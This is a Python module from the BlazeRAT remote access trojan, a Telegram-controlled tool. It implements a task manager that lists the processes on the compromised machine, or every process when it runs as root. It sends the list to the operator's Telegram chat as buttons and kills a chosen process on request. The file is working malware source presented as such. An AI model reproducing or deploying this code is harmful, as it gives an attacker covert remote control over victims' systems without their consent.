#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from telebot import types
from core.logger import Log
from os import getlogin, geteuid
from psutil import process_iter, Process
from core.messages import services as Messages

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to work with processes.
"""

""" Kill process by PID """
def KillProcess(callback: dict, bot):
    pid = int(callback.data[2:])
    chatid = callback.from_user.id
    Log(f"TaskManager >> Kill process {pid}", chatid)
    process = None
    try:
        process = Process(pid)
        if process != None:
            print(process)
            name = process.name()
            process.kill()
    except Exception as error:
        bot.send_message(chatid, Messages.taskmanager_process_kill_failed % (pid, error))
    else:
        bot.send_message(chatid, Messages.taskmanager_process_kill_success % (name, pid))

""" Get process list """
def ShowProcesses(message: dict, bot) -> None:
    chatid = message.chat.id
    bot.send_chat_action(chatid, "typing")
    Log("TaskManager >> Get process list", chatid)
    username = getlogin()
    is_root = geteuid() == 0
    if is_root: username = "root"
    # Get processes list
    processes = []
    for process in process_iter(['pid', 'name', 'username']):
        # Если юзер - root, то выводим все процессы
        if is_root:
            processes.append(process)
        # Если юзер не рут то выводим только его процессы
        else:
            if process.info["username"] == username:
                processes.append(process)
    # Create inline keyboard
    markup = types.InlineKeyboardMarkup()
    for process in processes:
        markup.add(types.InlineKeyboardButton(text=process.info["name"], callback_data="TM" + str(process.info["pid"])))
    # Show
    bot.send_message(chatid, Messages.taskmanager_process_list % (username, len(processes)), reply_markup=markup)
